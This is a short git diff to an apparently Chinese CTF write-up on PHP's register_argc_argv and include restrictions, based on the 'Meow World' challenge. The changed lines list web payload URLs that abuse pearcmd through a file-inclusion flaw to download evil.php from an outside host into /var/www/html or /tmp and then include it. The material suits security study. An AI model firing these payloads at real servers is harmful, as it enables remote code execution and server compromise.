@@ -6,7 +6,6 @@ tags:
   - php配置
 ---
 # register_argc_argv与include限制php任意文件下载的小结
-
 引子是巅峰极客2020的**Meow World**,题目总结下来只有一句话:
 
  ```php
@@ -224,7 +223,7 @@ main/php_variables.c
  - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php
  - http://ip:port/tmp/pear/download/evil.php
  // tmp目录可写
- - http://ip:port/include.php?f=pearcmd&+install+-R+/+http://ip:port/evil.php
+ - http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php
  - http://ip:port/include.php?f=/tmp/pear/download/evil
  ```
 
